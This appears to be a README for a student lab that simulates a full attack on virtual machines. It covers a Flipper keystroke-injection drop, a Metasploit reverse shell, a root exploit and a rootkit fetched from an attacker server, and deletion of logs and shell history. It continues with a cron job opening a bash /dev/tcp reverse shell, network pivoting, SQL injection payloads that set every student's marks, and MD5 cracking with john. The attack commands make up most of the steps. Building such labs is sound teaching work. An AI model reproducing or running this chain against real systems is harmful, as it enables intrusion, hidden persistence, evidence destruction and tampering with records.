# Malware-project
This project consists in a simulation of a real case scenario attack, with cloning a card, leaving a rubber ducky (in our case a Fliper since we have one) to get a reverse shell in the target (including privilage scalation) and then a rootkit with obfuscation methods. Finally, we are going to extract files, perform lateral movement to a vulnerable php and change the marks of some students. 

Here you will find the steps about reproducing the demo, you can find more explicit details en the readme of every folder of the project.

# Steps
## Setting up
We have 3 machines: Attacker, Teacher and Bob. The machine that connects the rubber ducky will be the teacher and Bob will have the vulnerable service. Both machines will run Ubuntu 20.04, but Bob can run any version since the vulnerability does not depend on the OS version. The attacker will run the last version of Kali linux.

To sum up we will have the following IPs (that can be set up with the bash in the config folder):
- Kali: 192.168.1.30
- Teacher: 192.168.1.20 and 10.10.1.20
- Bob: 10.10.1.30

Here we have two nets, 192.168.1.0/24 simulating internet, and 10.10.1.0/24 simulating an internal network.

Now, we verify that the connections are correct:
```
config/check_network.sh
```
If every thing is correct, we can proceed.
### Attacker
We set up the server simulating an external server that we are going to download the necessary files. All files are in the attackerside folder.
```
python server_http.py 
```
Now that we have the server listening in the port 55555, in another terminal we run metasploit. We run one by one the following commands:
```
sudo service postgresql start && msfconsole -q
```
```
use multi/handler
```
```
set LHOST 192.168.1.30
```
```
set LPORT 55505
```
```
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```
```
run
```
### Bob
In Bob we will have the docker instaled (see wordpress folder for instructions if you don't have it). Then run the docker going to the wordpress folder and run:
```
./docker.sh clean && ./docker.sh build
```
Then open a browser in Teacher and go to [http://10.10.1.30:8080](http://10.10.1.30:8080) if you see the login you can close and proceed with the demo.

### Alice
Connect Fliper with the devices options of virtualbox (it should look like a keyboard)

## Running the demo
1. In teacher we run the Fliper code and we can see all the commands that run. Here is a nutshell of what it does (**remember that we have delays to see it better and because we are in a VM and that in a real case we will have it running in the background**).
  1. Opens a terminals and goes to `/tmp/gotcha`
  2. Downloads and gives permission to `./iden_match.sh` that will generate and send the logs
  3. Gets the exploit from GitHub compiles it and opens a root shell access.
  4. With root executes again `./iden_match.sh` to send the logs as root.
  5. Gets the rootkit from our server and executes it.
  6. Gets the reverse shell payload and executes it in background.
  7. Removes all the contents of the `/tmp/gotcha` folder to erase any prove that anything happened
  8. Removes the history
  9. Closes the terminal

2. In attacker, we will have the logs in the logs folder, one without root and other with root. See that the MAC address corresponds to a VM and that we check if the processor is running as a VM or BARE METAL.

3. Now, in attacker we should have a shell (meterpeter), so we run
  1. meterpeter> `sysinfo`
  2. meterpeter> `shell`
  3. `/bin/bash -i` (This should open a shell)
  4. Analyzing the rootkit: root@...:/tmp/gotcha `netstat | grep 55505` (No output since it is obfucate it)
  5. Analyzing the rootkit: root@...:/tmp/gotcha `ls .. | grep gotcha` (No output since it is obfucate it)

12. Enseñar la reverse shell que se ha levantado en Attacker
		 
		 >>> Exam scanning
         root@...:  wget https://urldefense.com/v3/__http://192.168.1.30:55555/download/exam_scan.sh__;!!CzQxLBnXCA!_VJuhqOvAVHMLD72XfsKZ8P7l9yynyho0R3M67Zm4RbEiQ78FBcDfvZ7YCMi5hcIUHf8ezYRkfZiA7ddRg$ 
         root@....: chmod +x exam_scan.sh

		 >>> Persistence of the reverse shell
         root@...: cat /etc/cron*
		 root@...: echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.30/55505 0>&1'" > cron	
		 root@...: cat cron
		 root@...: crontab -i cron 
         root@...: crontab -l 
         exit
		 exit
		 
		 >>> Identify more devices in the network
		 meterpreter> ifconfig
		 meterpreter> arp
         meterpreter> run autoroute -s 10.10.1.0
         background
		 
	>>> Searching for vulnerable services on Bob
    msf6> use auxiliary/scanner/portscan/tcp 
	msf6> show options
    msf6> set RHOSTS 10.10.1.30
	msf6> run
    msf6> sessions 1
        
		>>> Stablishing a portfwd to connection from attacker 
		meterpreter> portfwd add -l 1234 -p 80 -r 10.10.1.30
		
13. Entrar por Firefox a localhost:1234 (en Kali) para ver el atacante e insertar 
	' OR 1=1#
	';SHOW databases# 
	';SHOW TABLES FROM manolita# 
	';SHOW COLUMNS FROM manolita.users#
	';SELECT * FROM manolita.users#
	';UPDATE manolita.users SET marks=10;#
	
14. Pillar un MD5 (el último por ejemplo)
	(PREVIOUSLY) rm ~/.john/john.pot
	echo "<INSERTAR_HASH>" > hash.txt
	
	john --format=Raw-MD5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
